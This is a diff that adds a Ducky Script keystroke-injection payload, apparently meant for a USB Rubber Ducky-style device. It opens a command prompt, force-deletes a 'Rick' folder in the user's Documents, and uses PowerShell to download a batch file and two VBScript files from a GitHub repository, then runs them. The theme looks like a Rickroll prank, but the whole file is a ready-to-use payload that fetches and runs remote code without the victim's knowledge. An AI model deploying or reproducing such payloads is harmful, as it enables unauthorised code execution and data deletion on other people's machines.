@@ -1,0 +1,26 @@
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING cd / && cd %USERPROFILE%\documents && If EXIST %USERPROFILE%\documents\Rick RMDIR %USERPROFILE%\documents\Rick /S /Q
+DELAY 250
+ENTER
+STRING mkdir Rick && cd Rick
+ENTER
+DELAY 250
+STRING Powershell
+DELAY 1000
+ENTER
+STRING Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/RICK.bat' -OutFile ./Rick.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/Rick.vbs' -OutFile ./RickSound.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/vol.vbs' -OutFile ./RickVOL.vbs
+DELAY 250
+ENTER
+DELAY 5000
+STRING cmd
+DELAY 250
+ENTER
+DELAY 500
+STRING start RickVOL & start RickSound.vbs & start Rick.bat
+DELAY 250 
+ENTER
